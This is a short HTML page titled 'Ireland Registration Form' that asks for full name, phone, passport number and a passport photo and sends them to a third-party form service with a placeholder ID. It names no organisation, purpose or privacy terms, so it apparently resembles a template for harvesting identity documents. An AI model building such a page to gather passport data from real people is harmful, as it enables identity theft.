<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Ireland Registration Form</title>

<style>
body {
    font-family: Arial;
    background: #e9f5ec;
}

.container {
    width: 420px;
    margin: auto;
    background: white;
    padding: 20px;
    margin-top: 40px;
    border-radius: 12px;
    box-shadow: 0px 0px 12px gray;
}

.header-img {
    width: 100%;
    border-radius: 10px;
}

h2 {
    text-align: center;
    color: green;
}

input, button {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    border-radius: 5px;
    border: 1px solid #ccc;
}

button {
    background: green;
    color: white;
    border: none;
    cursor: pointer;
}

button:hover {
    background: darkgreen;
}

footer {
    text-align: center;
    margin-top: 15px;
    color: red;
}
</style>
</head>

<body>

<div class="container">

    <!-- Ireland Image -->
    <img class="header-img" src="https://upload.wikimedia.org/wikipedia/commons/4/45/Flag_of_Ireland.svg">

    <h2>Ireland Registration Form</h2>

    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">

        <input type="text" name="fullname" placeholder="Full Name" required>

        <input type="tel" name="phone" placeholder="Phone Number" required>

        <input type="text" name="passport_number" placeholder="Passport Number" required>

        <label>Upload Passport Photo</label>
        <input type="file" name="passport_photo" accept="image/*" required>

        <button type="submit">Submit Application</button>

    </form>

    <footer>
        Your request is unprocessed.
    </footer>

</div>

</body>
</html>
